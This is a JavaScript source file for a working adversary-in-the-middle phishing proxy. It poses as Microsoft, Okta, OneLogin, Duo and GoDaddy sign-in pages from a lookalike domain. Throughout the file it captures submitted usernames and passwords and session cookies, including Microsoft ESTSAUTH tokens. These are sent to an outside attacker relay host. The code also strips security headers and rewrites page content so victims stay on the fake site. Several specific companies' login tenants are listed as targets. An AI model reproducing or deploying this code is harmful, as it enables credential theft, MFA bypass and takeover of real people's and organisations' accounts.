export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

// ---- Exfiltration Functions ----
async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {
    console.error('Failed to send to Vercel:', e);
  }
}

async function exfiltrateCookies(cookieText, ip, platform) {
  try {
    const content = 'IP: ' + ip + '\nPlatform: ' + platform + '\nData: Cookies found:\n\n' + cookieText + '\n';
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), ip + '-' + platform + '-COOKIE.txt');
    formData.append("ip", ip);
    formData.append("type", "cookie-file");

    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {
    console.error('Failed to exfiltrate cookies:', e);
  }
}

function parseCredentials(bodyText) {
  let user = null;
  let pass = null;

  if (!bodyText) return { user, pass };

  const keyValuePairs = bodyText.split('&');
  for (const pair of keyValuePairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;

    const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));

    if (key === 'login' || key === 'loginfmt' || key === 'username' || key === 'email' || key === 'user') {
      user = decodedValue;
    }
    if (key === 'passwd' || key === 'password' || key === 'pwd' || key === 'pass') {
      pass = decodedValue;
    }
  }

  return { user, pass };
}

function getUpstreamDomain(hostname) {
  // Check if the hostname is our proxy domain
  if (hostname === YOUR_DOMAIN) {
    return INITIAL_UPSTREAM;
  }
  
  // Check if it's a known identity provider
  for (const domain in IDENTITY_PROVIDERS) {
    if (hostname.includes(domain)) {
      return domain;
    }
  }
  
  return INITIAL_UPSTREAM;
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  console.log('Request received:', request.method, url.pathname);

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Determine upstream domain based on the request
  const upstreamDomain = getUpstreamDomain(url.hostname);
  const provider = IDENTITY_PROVIDERS[upstreamDomain] || { type: 'unknown' };
  
  // Build upstream URL - keep the same path and query
  const upstreamUrl = new URL(request.url);
  upstreamUrl.protocol = 'https:';
  upstreamUrl.host = upstreamDomain;

  console.log('[' + provider.type + '] ' + request.method + ' ' + url.toString() + ' -> ' + upstreamUrl.toString());

  // Handle OPTIONS request
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  // Build headers for upstream request
  const requestHeaders = new Headers();
  
  // Copy only safe headers from original request
  const safeHeaders = ['accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'user-agent'];
  for (const header of safeHeaders) {
    const value = request.headers.get(header);
    if (value) {
      requestHeaders.set(header, value);
    }
  }
  
  // Set required headers
  requestHeaders.set('Host', upstreamDomain);
  requestHeaders.set('Referer', 'https://' + upstreamDomain + '/');
  requestHeaders.set('Origin', 'https://' + upstreamDomain);
  
  // Set default User-Agent if not present
  if (!requestHeaders.has('user-agent')) {
    requestHeaders.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
  }
  
  // Set default Accept if not present
  if (!requestHeaders.has('accept')) {
    requestHeaders.set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
  }
  
  // Set default Accept-Language if not present
  if (!requestHeaders.has('accept-language')) {
    requestHeaders.set('Accept-Language', 'en-US,en;q=0.9');
  }

  // ---- Credentials capture for POST requests ----
  if (request.method === 'POST') {
    try {
      const clonedRequest = request.clone();
      const bodyText = await clonedRequest.text();
      const { user, pass } = parseCredentials(bodyText);

      if (user && pass) {
        console.log('[CREDENTIALS CAPTURED] User: ' + user.substring(0, 5) + '... Platform: ' + provider.type);

        await sendToVercel('credentials', {
          type: "creds",
          ip: ip,
          user: user,
          pass: pass,
          platform: provider.type,
          url: url.toString()
        }).catch(e => console.error('Vercel send failed:', e));

        const content = 'IP: ' + ip + '\nPlatform: ' + provider.type + '\nUser: ' + user + '\nPass: ' + pass + '\nURL: ' + url.toString() + '\n';
        const formData = new FormData();
        formData.append("file", new Blob([content], { type: "text/plain" }), ip + '-CREDENTIALS.txt');
        formData.append("ip", ip);
        formData.append("type", "credentials");

        await fetch(VERCEL_URL, {
          method: "POST",
          body: formData,
        }).catch(e => console.error('Vercel file upload failed:', e));
      }
    } catch (error) {
      console.error('Credential capture error:', error);
    }
  }

  try {
    // Prepare fetch options
    const fetchOptions = {
      method: request.method,
      headers: requestHeaders,
      redirect: 'manual'
    };

    // Add body for non-GET/HEAD requests
    if (!['GET', 'HEAD'].includes(request.method)) {
      // Clone the request to avoid consuming it
      const clonedRequest = request.clone();
      fetchOptions.body = clonedRequest.body;
    }

    console.log('[DEBUG] Fetching upstream:', upstreamUrl.toString());
    console.log('[DEBUG] Method:', request.method);
    console.log('[DEBUG] Headers:', Object.fromEntries(requestHeaders.entries()));

    // Proxy request to upstream with timeout
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
    
    let response;
    try {
      response = await fetch(upstreamUrl.toString(), {
        ...fetchOptions,
        signal: controller.signal
      });
    } catch (fetchError) {
      clearTimeout(timeoutId);
      console.error('[ERROR] Fetch failed:', fetchError);
      
      // Try one more time with minimal headers
      console.log('[RETRY] Attempting with minimal headers...');
      const retryHeaders = new Headers();
      retryHeaders.set('Host', upstreamDomain);
      retryHeaders.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
      retryHeaders.set('Accept', '*/*');
      
      const retryOptions = {
        method: request.method,
        headers: retryHeaders,
        redirect: 'manual'
      };
      
      if (!['GET', 'HEAD'].includes(request.method)) {
        const clonedRequest = request.clone();
        retryOptions.body = clonedRequest.body;
      }
      
      response = await fetch(upstreamUrl.toString(), retryOptions);
    }
    
    clearTimeout(timeoutId);

    console.log('[DEBUG] Upstream response status:', response.status);
    console.log('[DEBUG] Response headers:', Object.fromEntries(response.headers.entries()));

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const location = response.headers.get('Location');
      if (location) {
        const newHeaders = new Headers(response.headers);
        // Rewrite location to go through our proxy
        try {
          const locationUrl = new URL(location, upstreamUrl);
          locationUrl.host = YOUR_DOMAIN;
          newHeaders.set('Location', locationUrl.toString());
          console.log('[Redirect] ' + location + ' -> ' + locationUrl.toString());
        } catch (e) {
          console.error('[Redirect Error]', e);
          // If it's a relative URL, prepend our domain
          if (location.startsWith('/')) {
            newHeaders.set('Location', 'https://' + YOUR_DOMAIN + location);
          } else {
            newHeaders.set('Location', location);
          }
        }
        return new Response(null, { status: response.status, headers: newHeaders });
      }
    }

    // Process response headers
    const newHeaders = new Headers(response.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    newHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, X-Requested-With');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    newHeaders.delete('strict-transport-security');
    newHeaders.delete('content-length'); // Let the response calculate this

    // ---- Capture and rewrite cookies ----
    const cookies = response.headers.getSetCookie?.() || [];
    let allCookies = '';
    
    if (cookies.length > 0) {
      allCookies = cookies.join('; ');
      
      // Check for critical auth cookies
      const criticalPatterns = CRITICAL_AUTH_COOKIES[provider.type] || [];
      const hasCriticalCookies = criticalPatterns.some(pattern => {
        if (pattern === '.*') return true;
        return allCookies.toLowerCase().includes(pattern.toLowerCase());
      });

      if (hasCriticalCookies) {
        console.log('[COOKIE CAPTURE] Found critical auth cookies');
        await exfiltrateCookies(allCookies, ip, provider.type).catch(e => console.error('Cookie exfiltration failed:', e));
      }

      // Rewrite cookies to work with our proxy domain
      cookies.forEach(cookie => {
        if (!cookie) return;
        // Replace upstream domain with our proxy domain in the cookie
        let modifiedCookie = cookie.replace(new RegExp(upstreamDomain, 'gi'), YOUR_DOMAIN);
        
        // Ensure Secure and SameSite attributes for proxy
        if (!modifiedCookie.toLowerCase().includes('samesite')) {
          modifiedCookie += '; SameSite=None';
        }
        if (!modifiedCookie.toLowerCase().includes('secure')) {
          modifiedCookie += '; Secure';
        }
        
        newHeaders.append('Set-Cookie', modifiedCookie);
      });
    }

    // Process response body for HTML/JavaScript content
    const contentType = response.headers.get('content-type') || '';
    
    if (/text\/html|application\/javascript|application\/json|text\/javascript|text\/css/.test(contentType)) {
      let text = await response.text();
      
      // Replace upstream domain with our proxy domain in the content
      text = text.replace(new RegExp(upstreamDomain, 'g'), YOUR_DOMAIN);
      
      // Also replace other known Microsoft domains
      if (provider.type === 'microsoft') {
        text = text.replace(/login\.live\.com/g, YOUR_DOMAIN);
        text = text.replace(/account\.live\.com/g, YOUR_DOMAIN);
        text = text.replace(/account\.microsoft\.com/g, YOUR_DOMAIN);
        text = text.replace(/aadcdn\.msauth\.net/g, YOUR_DOMAIN);
        text = text.replace(/login\.windows\.net/g, YOUR_DOMAIN);
      }
      
      // Replace https:// in URLs to ensure they go through proxy
      text = text.replace(/https:\/\/[^\/]+\/_next/g, 'https://' + YOUR_DOMAIN + '/_next');
      
      // Add a simple script to handle dynamic content
      if (contentType.includes('text/html')) {
        const interceptorScript = '<script>window.__PROXY_DOMAIN__="' + YOUR_DOMAIN + '";window.__UPSTREAM_DOMAIN__="' + upstreamDomain + '";</script>';
        if (text.includes('<head>')) {
          text = text.replace('<head>', '<head>' + interceptorScript);
        } else if (text.includes('<html>')) {
          text = text.replace('<html>', '<html>' + interceptorScript);
        } else {
          text = interceptorScript + text;
        }
      }

      return new Response(text, { 
        status: response.status, 
        headers: newHeaders 
      });
    }

    // For non-text content, return as-is
    return new Response(response.body, { 
      status: response.status, 
      headers: newHeaders 
    });

  } catch (err) {
    console.error('[' + provider.type + '] Fatal Error:', err);
    console.error('Error stack:', err.stack);
    
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: err.message || 'Unknown error',
      stack: err.stack || '',
      url: upstreamUrl.toString()
    }), { 
      status: 502, 
      headers: { 'content-type': 'application/json' } 
    });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
